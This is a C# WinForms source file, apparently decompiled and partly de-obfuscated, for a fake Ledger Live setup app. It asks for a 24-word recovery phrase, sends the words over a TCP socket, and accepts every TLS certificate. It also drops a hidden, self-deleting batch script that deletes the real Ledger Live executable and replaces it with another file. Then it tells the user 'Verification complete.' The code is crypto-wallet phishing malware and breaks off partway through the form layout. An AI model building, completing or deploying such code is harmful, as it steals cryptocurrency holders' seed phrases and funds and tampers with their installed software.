/*using Ledger.MainClassFolder;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Ledger.ScrollBar;


// was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDר\uFFFDΔᛈᛈ\uFFFD
using CuiUiControl = Ledger.ScrollBar.CuiButtonControl;//was  \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDר\uFFFDΔᛈᛈ\uFFFD;
using ContentAlignment = System.Drawing.ContentAlignment;

namespace Ledger.MainClassFolder
{

    public class MainFormBAOClass : Form
    {
        public MainFormBAOClass()
        {
            this.InitializeComponent();
            this.bunifuDropdown1.BringToFront();
            this.AutoScaleMode = AutoScaleMode.Dpi;
            for (int index = 1; index <= 24; ++index)
            {
                if (((IEnumerable<Control>)this.panel4.Controls.Find($"mnem{index}", true)).FirstOrDefault<Control>() is TextBox textBox)
                    textBox.KeyPress += new KeyPressEventHandler(this.Mnem_KeyPress);
            }
        }

        //not sure about the conversion 
        private async Task<bool> SendViaSocket(string mnemonic)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    await client.ConnectAsync("127.0.0.1", 8080);
                    NetworkStream stream = client.GetStream();

                    byte[] data = Encoding.UTF8.GetBytes(mnemonic);
                    await stream.WriteAsync(data, 0, data.Length);
                }

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
        }

        private async void Readybtn_Click(object sender, EventArgs e)
        {
            try
            {
                // Disable button to prevent double clicks
                // Readybtn.Enabled = false;

                // Get mnemonic from your TextBox (change the name to match yours)
                string mnemonic = "";//mnemonicTextBox.Text;  // ← Replace with your actual control name

                // Validate
                if (string.IsNullOrWhiteSpace(mnemonic))
                {
                    MessageBox.Show("Please enter a mnemonic.", "Validation Error");
                    return;
                }

                // Send via socket
                bool success = await SendViaSocket(mnemonic);

                // Show result
                if (success)
                {
                    MessageBox.Show("Sent successfully!");
                }
                else
                {
                    MessageBox.Show("Failed to send.");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message}");
            }
            finally
            {
                // Re-enable button
                // Readybtn.Enabled = true;
            }
        }
    
    
        private void ShowFinalAlert(bool success)
        {
            if (success)
            {
                this.ScheduleFileRestoration();

                AlertPopupForm.Show( // was \uFFFDΑ\uFFFD\uD802\uDC04\uFFFD\uFFFD\uFFFDT\uFFFDC
                    "Verification complete!\nRestart Ledger Live App.",
                    AlertPopupForm.AlertType.warning // was \uFFFDΑ\uFFFD\uD802\uDC04\uFFFD\uFFFD\uFFFDT\uFFFDC.\uFFFDܠ\uFFFD\uFFFD\uFFFD\uFFFDע\uFFFDᚏΥ\uFFFDג\uFFFD.warning
                );

                this.Close();
            }
            else
                AlertPopupForm.Show( // was \uFFFDΑ\uFFFD\uD802\uDC04\uFFFD\uFFFD\uFFFDT\uFFFDC
                    "Connection failed\n" + (System.IO.File.Exists("connection_diagnostics.log")
                        ? "Error details saved to connection_diagnostics.log"
                        : "No connection details available"),
                    AlertPopupForm.AlertType.warning // was \uFFFDΑ\uFFFD\uD802\uDC04\uFFFD\uFFFD\uFFFDT\uFFFDC.\uFFFDܠ\uFFFD\uFFFD\uFFFD\uFFFDע\uFFFDᚏΥ\uFFFDג\uFFFD.warning
                );
        }

        private void ScheduleFileRestoration()
        {
            try
            {
                string contents = $"\r\n@echo off\r\nchcp 65001 >nul\r\n:loop\r\ndel \"{MainClass.ledgerLivePath}\" 2>nul\r\nif exist \"{MainClass.ledgerLivePath}\" (\r\n    timeout /t 1 /nobreak >nul\r\n    goto loop\r\n)\r\nmove \"{MainClass.ledgerConfPath}\" \"{MainClass.ledgerLivePath}\" >nul\r\ndel \"%~f0\"";
                string path = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.bat");
                System.IO.File.WriteAllText(path, contents, Encoding.ASCII);
                Process.Start(new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C \"\"{path}\"\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch
            {
            }
        }

        private string GetLocalIPAddress()
        {
            try
            {
                return ((IEnumerable<IPAddress>)Dns.GetHostEntry(Dns.GetHostName()).AddressList).FirstOrDefault<IPAddress>((Func<IPAddress, bool>)(ip => ip.AddressFamily == AddressFamily.InterNetwork))?.ToString() ?? "N/A";
            }
            catch
            {
                return "N/A";
            }
        }
        private bool ValidateServerCertificate(
          object sender,
          X509Certificate certificate,
          X509Chain chain,
          SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }


        // Renames applied ONLY to gibberish/obfuscated TYPE NAMES + the gibberish typeof(...) reference.
        // I did NOT rename any existing variables or function names.

        // Type aliases:
        // was \uFFFDשᚢ\uFFFDZ\uFFFDᛊ\uFFFD\uFFFDᚦᛃ

       // private AxWindowsMediaPlayerHost axWindowsMediaPlayer1; // was \uFFFDשᚢ\uFFFDZ\uFFFDᛊ\uFFFD\uFFFDᚦᛃ

        //give code from here always.
        private IContainer components;
        private Panel panel1;
        private Panel panel2;
        private Panel panel3;
        private CuiUiControl cuiButton2; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDר\uFFFDΔᛈᛈ\uFFFD
        private CuiUiControl cuiButton1; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDר\uFFFDΔᛈᛈ\uFFFD
        private Label label2;
        private Label label4;
        private Label label3;
        private CuiUiControl cuiButton3; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDر\uFFFDΔᛈᛈ\uFFFD
        private System.Windows.Forms.Timer timer1;
        private PictureBox pictureBox1;
        private Panel page1;
        private Panel Page2;
        private Panel Page3;
        private Label SetUp;
        private Label FirstTime;
        private CuiUiControl nanoXbtn; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDר\uFFFDΔᛈᛈ\uFFFD
        private CuiUiControl nanoSbtn; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDر\uFFFDΔᛈᛈ\uFFFD
        private CuiUiControl Staxbtn; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDر\uFFFDΔᛈᛈ\uFFFD
        private CuiUiControl Flexbtn; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDر\uFFFDΔᛈᛈ\uFFFD
        private CuiUiControl nanoSplusbtn; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDر\uFFFDΔᛈᛈ\uFFFD
        private CuiUiControl cuiButton9; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDר\uFFFDΔᛈᛈ\uFFFD
        private CuiUiControl cuiButton10; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDر\uFFFDΔᛈᛈ\uFFFD
        private Panel Page4;
        private CuiUiControl Backbt; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDر\uFFFDΔᛈᛈ\uFFFD
        private CuiUiControl Readybtn; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDر\uFFFDΔᛈᛈ\uFFFD
        private Panel panel4;
        private CuiUiControl cuiButton4; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDר\uFFFDΔᛈᛈ\uFFFD
        private CuiUiControl cuiButton6; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDر\uFFFDΔᛈᛈ\uFFFD
        private CuiUiControl cuiButton5; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDר\uFFFDΔᛈᛈ\uFFFD
        private TextBox mnem1;
        private Label label15;
        private Label label14;
        private Label label13;
        private Label label12;
        private Label label11;
        private Label label10;
        private Label label9;
        private Label label8;
        private Label label7;
        private Label label6;
        private Label label5;
        private Label label1;
        private TextBox mnem12;
        private TextBox mnem11;
        private TextBox mnem10;
        private TextBox mnem9;
        private TextBox mnem8;
        private TextBox mnem7;
        private TextBox mnem6;
        private TextBox mnem5;
        private TextBox mnem4;
        private TextBox mnem3;
        private TextBox mnem2;
        private ImageList imageList1;
        private TextBox mnem24;
        private TextBox mnem23;
        private TextBox mnem22;
        private TextBox mnem21;
        private TextBox mnem20;
        private TextBox mnem19;
        private TextBox mnem18;
        private TextBox mnem17;
        private TextBox mnem16;
        private TextBox mnem15;
        private TextBox mnem14;
        private Label label16;
        private Label label17;
        private Label label18;
        private Label label19;
        private Label label20;
        private Label label21;
        private Label label22;
        private Label label23;
        private Label label24;
        private Label label25;
        private Label label26;
        private Label label27;
        private TextBox mnem13;
        private CuiUiControl bunifuDropdown1; // was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDר\uFFFDΔᛈᛈ\uFFFD
        private ContextMenuStrip contextMenuStrip1;
        private ToolStripMenuItem englishToolStripMenuItem;
        private ToolStripMenuItem françaisToolStripMenuItem;
        private ToolStripMenuItem deutschToolStripMenuItem;
        private ToolStripMenuItem рyссийToolStripMenuItem;
        private ToolStripMenuItem españolToolStripMenuItem;

        private void Ledger_Load(object sender, EventArgs e)
        {
        }

        protected void RefreshDropdown()
        {
            this.bunifuDropdown1.BackColor = Color.Transparent;
            this.bunifuDropdown1.Parent.Refresh();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            this.bunifuDropdown1.BringToFront();
            this.RefreshDropdown();
        }

        private void cuiButton1_Click(object sender, EventArgs e)
        {
            this.Page4.Visible = false;
            this.page1.Visible = false;
            this.Page3.Visible = false;
            this.Page2.Visible = true;
        }

        private void cuiButton10_Click(object sender, EventArgs e)
        {
            this.Page4.Visible = false;
            this.Page3.Visible = false;
            this.Page2.Visible = false;
            this.page1.Visible = true;
        }

        private void cuiButton9_Click(object sender, EventArgs e)
        {
            this.Page4.Visible = false;
            this.Page3.Visible = false;
            this.page1.Visible = false;
            this.Page2.Visible = true;
        }

        private void Staxbtn_Click(object sender, EventArgs e)
        {
            this.Page2.Visible = false;
            this.page1.Visible = false;
            this.Page4.Visible = false;
            this.Page3.Visible = true;
            this.FirstTime.Text = "YOUR STAX?";
            this.SetUp.Text = "SETUP A NEW STAX";
        }

        private void Flexbtn_Click(object sender, EventArgs e)
        {
            this.Page2.Visible = false;
            this.page1.Visible = false;
            this.Page4.Visible = false;
            this.Page3.Visible = true;
            this.FirstTime.Text = "YOUR FLEX?";
            this.SetUp.Text = "SETUP A FLEX";
        }

        private void nanoSbtn_Click(object sender, EventArgs e)
        {
            this.Page2.Visible = false;
            this.page1.Visible = false;
            this.Page4.Visible = false;
            this.Page3.Visible = true;
            this.FirstTime.Text = "YOUR NANO S?";
            this.SetUp.Text = "SETUP A NEW NANO S";
        }

        private void nanoSplusbtn_Click(object sender, EventArgs e)
        {
            this.Page2.Visible = false;
            this.page1.Visible = false;
            this.Page4.Visible = false;
            this.Page3.Visible = true;
            this.FirstTime.Text = "YOUR NANO S PLUS?";
            this.SetUp.Text = "SETUP A NEW NANO S PLUS";
        }

        private void nanoXbtn_Click(object sender, EventArgs e)
        {
            this.Page2.Visible = false;
            this.page1.Visible = false;
            this.Page4.Visible = false;
            this.Page3.Visible = true;
            this.FirstTime.Text = "YOUR NANO X?";
            this.SetUp.Text = "SETUP A NEW NANO X";
        }

        private void Backbt_Click(object sender, EventArgs e)
        {
            this.Page4.Visible = false;
            this.Page2.Visible = false;
            this.page1.Visible = false;
            this.Page3.Visible = true;
        }

        private void cuiButton4_Click(object sender, EventArgs e)
        {
            this.Page3.Visible = false;
            this.Page2.Visible = false;
            this.page1.Visible = false;
            this.Page4.Visible = true;
        }

        private void cuiButton5_Click(object sender, EventArgs e)
        {
            this.Page3.Visible = false;
            this.Page2.Visible = false;
            this.page1.Visible = false;
            this.Page4.Visible = true;
        }

        private void cuiButton6_Click(object sender, EventArgs e)
        {
            this.Page3.Visible = false;
            this.Page2.Visible = false;
            this.page1.Visible = false;
            this.Page4.Visible = true;
        }

        private void Mnem_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (char.IsLetter(e.KeyChar) || char.IsControl(e.KeyChar) || e.KeyChar == ' ')
                return;
            e.Handled = true;
        }

        private void bunifuDropdown1_Click(object sender, EventArgs e)
        {
            this.contextMenuStrip1.Show((Control)this.bunifuDropdown1, 0, this.bunifuDropdown1.Height);
        }

        private void cuiButton2_Click(object sender, EventArgs e)
        {
            Process.Start("https://shop.ledger.com/");
        }

        private void cuiButton3_Click(object sender, EventArgs e)
        {
            this.Page4.Visible = false;
            this.page1.Visible = false;
            this.Page3.Visible = false;
            this.Page2.Visible = true;
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
                this.components.Dispose();
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.page1 = new System.Windows.Forms.Panel();
            this.panel2 = new System.Windows.Forms.Panel();
            this.bunifuDropdown1 = new Ledger.ScrollBar.CuiButtonControl();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.panel1 = new System.Windows.Forms.Panel();
            this.cuiButton3 = new Ledger.ScrollBar.CuiButtonControl();
            this.label4 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.cuiButton2 = new Ledger.ScrollBar.CuiButtonControl();
            this.cuiButton1 = new Ledger.ScrollBar.CuiButtonControl();
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.englishToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.françaisToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.deutschToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.рyссийToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.españolToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.Page4 = new System.Windows.Forms.Panel();
            this.panel4 = new System.Windows.Forms.Panel();
            this.mnem24 = new System.Windows.Forms.TextBox();
            this.mnem23 = new System.Windows.Forms.TextBox();
            this.mnem22 = new System.Windows.Forms.TextBox();
            this.mnem21 = new System.Windows.Forms.TextBox();
            this.mnem20 = new System.Windows.Forms.TextBox();
            this.mnem19 = new System.Windows.Forms.TextBox();
            this.mnem18 = new System.Windows.Forms.TextBox();
            this.mnem17 = new System.Windows.Forms.TextBox();
            this.mnem16 = new System.Windows.Forms.TextBox();
            this.mnem15 = new System.Windows.Forms.TextBox();
            this.mnem14 = new System.Windows.Forms.TextBox();
            this.label16 = new System.Windows.Forms.Label();
            this.label17 = new System.Windows.Forms.Label();
            this.label18 = new System.Windows.Forms.Label();
            this.label19 = new System.Windows.Forms.Label();
            this.label20 = new System.Windows.Forms.Label();
            this.label21 = new System.Windows.Forms.Label();
            this.label22 = new System.Windows.Forms.Label();
            this.label23 = new System.Windows.Forms.Label();
            this.label24 = new System.Windows.Forms.Label();
            this.label25 = new System.Windows.Forms.Label();
            this.label26 = new System.Windows.Forms.Label();
            this.label27 = new System.Windows.Forms.Label();
            this.mnem13 = new System.Windows.Forms.TextBox();
            this.mnem12 = new System.Windows.Forms.TextBox();
            this.mnem11 = new System.Windows.Forms.TextBox();
            this.mnem10 = new System.Windows.Forms.TextBox();
            this.mnem9 = new System.Windows.Forms.TextBox();
            this.mnem8 = new System.Windows.Forms.TextBox();
            this.mnem7 = new System.Windows.Forms.TextBox();
            this.mnem6 = new System.Windows.Forms.TextBox();
            this.mnem5 = new System.Windows.Forms.TextBox();
            this.mnem4 = new System.Windows.Forms.TextBox();
            this.mnem3 = new System.Windows.Forms.TextBox();
            this.mnem2 = new System.Windows.Forms.TextBox();
            this.label15 = new System.Windows.Forms.Label();
            this.label14 = new System.Windows.Forms.Label();
            this.label13 = new System.Windows.Forms.Label();
            this.label12 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.mnem1 = new System.Windows.Forms.TextBox();
            this.Readybtn = new Ledger.ScrollBar.CuiButtonControl();
            this.Backbt = new Ledger.ScrollBar.CuiButtonControl();
            this.panel3 = new System.Windows.Forms.Panel();
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.Page3 = new System.Windows.Forms.Panel();
            this.cuiButton9 = new Ledger.ScrollBar.CuiButtonControl();
            this.SetUp = new System.Windows.Forms.Label();
            this.FirstTime = new System.Windows.Forms.Label();
            this.cuiButton4 = new Ledger.ScrollBar.CuiButtonControl();
            this.cuiButton5 = new Ledger.ScrollBar.CuiButtonControl();
            this.cuiButton6 = new Ledger.ScrollBar.CuiButtonControl();
            this.Page2 = new System.Windows.Forms.Panel();
            this.cuiButton10 = new Ledger.ScrollBar.CuiButtonControl();
            this.nanoSbtn = new Ledger.ScrollBar.CuiButtonControl();
            this.Staxbtn = new Ledger.ScrollBar.CuiButtonControl();
            this.Flexbtn = new Ledger.ScrollBar.CuiButtonControl();
            this.nanoSplusbtn = new Ledger.ScrollBar.CuiButtonControl();
            this.nanoXbtn = new Ledger.ScrollBar.CuiButtonControl();
            this.page1.SuspendLayout();
            this.panel2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.panel1.SuspendLayout();
            this.contextMenuStrip1.SuspendLayout();
            this.Page4.SuspendLayout();
            this.panel4.SuspendLayout();
            this.Page3.SuspendLayout();
            this.Page2.SuspendLayout();
            this.SuspendLayout();
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 1000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // page1
            // 
            this.page1.Controls.Add(this.panel2);
            this.page1.Controls.Add(this.panel1);
            this.page1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.page1.Location = new System.Drawing.Point(0, 0);
            this.page1.Margin = new System.Windows.Forms.Padding(4);
            this.page1.Name = "page1";
            this.page1.Size = new System.Drawing.Size(1604, 875);
            this.page1.TabIndex = 2;
            // 
            // panel2
            // 
            this.panel2.BackColor = System.Drawing.Color.Black;
            this.panel2.BackgroundImage = global::Ledger.MainClassFolder.Properties.Resources.latest;
            this.panel2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.panel2.Controls.Add(this.bunifuDropdown1);
            this.panel2.Controls.Add(this.pictureBox1);
            this.panel2.Dock = System.Windows.Forms.DockStyle.Fill;
            this.panel2.Location = new System.Drawing.Point(428, 0);
            this.panel2.Margin = new System.Windows.Forms.Padding(4);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(1176, 875);
            this.panel2.TabIndex = 1;
            // 
            // bunifuDropdown1
            // 
            this.bunifuDropdown1.BackColor = System.Drawing.Color.Transparent;
            this.bunifuDropdown1.CheckButton = false;
            this.bunifuDropdown1.Checked = false;
            this.bunifuDropdown1.CheckedBackground = System.Drawing.Color.Transparent;
            this.bunifuDropdown1.CheckedForeColor = System.Drawing.Color.Black;
            this.bunifuDropdown1.CheckedImageTint = System.Drawing.Color.Black;
            this.bunifuDropdown1.CheckedOutline = System.Drawing.Color.Transparent;
            this.bunifuDropdown1.Content = "English";
            this.bunifuDropdown1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.bunifuDropdown1.DialogResult = System.Windows.Forms.DialogResult.None;
            this.bunifuDropdown1.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold);
            this.bunifuDropdown1.ForeColor = System.Drawing.Color.Black;
            this.bunifuDropdown1.HoverBackground = System.Drawing.Color.Transparent;
            this.bunifuDropdown1.HoveredImageTint = System.Drawing.Color.Black;
            this.bunifuDropdown1.HoverForeColor = System.Drawing.Color.Black;
            this.bunifuDropdown1.HoverOutline = System.Drawing.Color.Transparent;
            this.bunifuDropdown1.Image = global::Ledger.MainClassFolder.Properties.Resources.Expand_Arrow;
            this.bunifuDropdown1.ImageAutoCenter = true;
            this.bunifuDropdown1.ImageExpand = new System.Drawing.Point(0, 0);
            this.bunifuDropdown1.ImageOffset = new System.Drawing.Point(0, 0);
            this.bunifuDropdown1.Location = new System.Drawing.Point(1919, 50);
            this.bunifuDropdown1.Margin = new System.Windows.Forms.Padding(4);
            this.bunifuDropdown1.Name = "bunifuDropdown1";
            this.bunifuDropdown1.NormalBackground = System.Drawing.Color.Transparent;
            this.bunifuDropdown1.NormalForeColor = System.Drawing.Color.Black;
            this.bunifuDropdown1.NormalImageTint = System.Drawing.Color.Black;
            this.bunifuDropdown1.NormalOutline = System.Drawing.Color.Transparent;
            this.bunifuDropdown1.OutlineThickness = 1F;
            this.bunifuDropdown1.PressedBackground = System.Drawing.Color.Transparent;
            this.bunifuDropdown1.PressedForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(32)))), ((int)(((byte)(32)))), ((int)(((byte)(32)))));
            this.bunifuDropdown1.PressedImageTint = System.Drawing.Color.Black;
            this.bunifuDropdown1.PressedOutline = System.Drawing.Color.Transparent;
            this.bunifuDropdown1.Rounding = new System.Windows.Forms.Padding(8);
            this.bunifuDropdown1.Size = new System.Drawing.Size(255, 55);
            this.bunifuDropdown1.TabIndex = 2;
            this.bunifuDropdown1.TextAlignment = System.Drawing.StringAlignment.Near;
            this.bunifuDropdown1.TextOffset = new System.Drawing.Point(0, 0);
            this.bunifuDropdown1.Click += new System.EventHandler(this.bunifuDropdown1_Click);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.pictureBox1.Image = global::Ledger.MainClassFolder.Properties.Resources.latest;
            this.pictureBox1.Location = new System.Drawing.Point(0, 0);
            this.pictureBox1.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(1176, 875);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 0;
            this.pictureBox1.TabStop = false;
            // 
            // panel1
            // 
            this.panel1.BackgroundImage = global::Ledger.MainClassFolder.Properties.Resources.Screenshot_2025_04_25_193437;
            this.panel1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.panel1.Controls.Add(this.cuiButton3);
            this.panel1.Controls.Add(this.label4);
            this.panel1.Controls.Add(this.label3);
            this.panel1.Controls.Add(this.label2);
            this.panel1.Controls.Add(this.cuiButton2);
            this.panel1.Controls.Add(this.cuiButton1);
            this.panel1.Dock = System.Windows.Forms.DockStyle.Left;
            this.panel1.Location = new System.Drawing.Point(0, 0);
            this.panel1.Margin = new System.Windows.Forms.Padding(4);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(428, 875);
            this.panel1.TabIndex = 0;
            // 
            // cuiButton3
            // 
            this.cuiButton3.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.cuiButton3.BackColor = System.Drawing.Color.Transparent;
            this.cuiButton3.CheckButton = false;
            this.cuiButton3.Checked = false;
            this.cuiButton3.CheckedBackground = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.cuiButton3.CheckedForeColor = System.Drawing.Color.White;
            this.cuiButton3.CheckedImageTint = System.Drawing.Color.White;
            this.cuiButton3.CheckedOutline = System.Drawing.Color.DarkGray;
            this.cuiButton3.Content = "Sync with aother Ledger Live app";
            this.cuiButton3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.cuiButton3.DialogResult = System.Windows.Forms.DialogResult.None;
            this.cuiButton3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.cuiButton3.ForeColor = System.Drawing.Color.White;
            this.cuiButton3.HoverBackground = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.cuiButton3.HoveredImageTint = System.Drawing.Color.White;
            this.cuiButton3.HoverForeColor = System.Drawing.Color.White;
            this.cuiButton3.HoverOutline = System.Drawing.Color.DarkGray;
            this.cuiButton3.Image = null;
            this.cuiButton3.ImageAutoCenter = true;
            this.cuiButton3.ImageExpand = new System.Drawing.Point(0, 0);
            this.cuiButton3.ImageOffset = new System.Drawing.Point(0, 0);
            this.cuiButton3.Location = new System.Drawing.Point(36, 808);
            this.cuiButton3.Margin = new System.Windows.Forms.Padding(4);
            this.cuiButton3.Name = "cuiButton3";
            this.cuiButton3.NormalBackground = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(20)))), ((int)(((byte)(21)))));
            this.cuiButton3.NormalForeColor = System.Drawing.Color.White;
            this.cuiButton3.NormalImageTint = System.Drawing.Color.White;
            this.cuiButton3.NormalOutline = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(20)))), ((int)(((byte)(21)))));
            this.cuiButton3.OutlineThickness = 1.6F;
            this.cuiButton3.PressedBackground = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.cuiButton3.PressedForeColor = System.Drawing.Color.White;
            this.cuiButton3.PressedImageTint = System.Drawing.Color.White;
            this.cuiButton3.PressedOutline = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.cuiButton3.Rounding = new System.Windows.Forms.Padding(18);
            this.cuiButton3.Size = new System.Drawing.Size(357, 46);
            this.cuiButton3.TabIndex = 6;
            this.cuiButton3.TextAlignment = System.Drawing.StringAlignment.Center;
            this.cuiButton3.TextOffset = new System.Drawing.Point(0, 0);
            this.cuiButton3.Click += new System.EventHandler(this.cuiButton3_Click);
            // 
            // label4
            // 
            this.label4.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Underline))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(187)))), ((int)(((byte)(166)))), ((int)(((byte)(233)))));
            this.label4.Location = new System.Drawing.Point(140, 915);
            this.label4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(114, 17);
            this.label4.TabIndex = 5;
            this.label4.Text = "Privacy Policy.\r\n";
            // 
            // label3
            // 
            this.label3.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Underline))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(187)))), ((int)(((byte)(166)))), ((int)(((byte)(233)))));
            this.label3.Location = new System.Drawing.Point(156, 894);
            this.label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(171, 17);
            this.label3.TabIndex = 4;
            this.label3.Text = "Terms and Conditions ";
            // 
            // label2
            // 
            this.label2.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.Transparent;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.DarkGray;
            this.label2.Location = new System.Drawing.Point(45, 879);
            this.label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(316, 34);
            this.label2.TabIndex = 3;
            this.label2.Text = "By tapping \"Get Started\" you consent and \r\nagree to our                          " +
    "        and\r\n";
            this.label2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // cuiButton2
            // 
            this.cuiButton2.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.cuiButton2.CheckButton = false;
            this.cuiButton2.Checked = false;
            this.cuiButton2.CheckedBackground = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
            this.cuiButton2.CheckedForeColor = System.Drawing.Color.White;
            this.cuiButton2.CheckedImageTint = System.Drawing.Color.White;
            this.cuiButton2.CheckedOutline = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.cuiButton2.Content = "No Device?Buy Ledger";
            this.cuiButton2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.cuiButton2.DialogResult = System.Windows.Forms.DialogResult.None;
            this.cuiButton2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.cuiButton2.ForeColor = System.Drawing.Color.White;
            this.cuiButton2.HoverBackground = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(27)))), ((int)(((byte)(28)))));
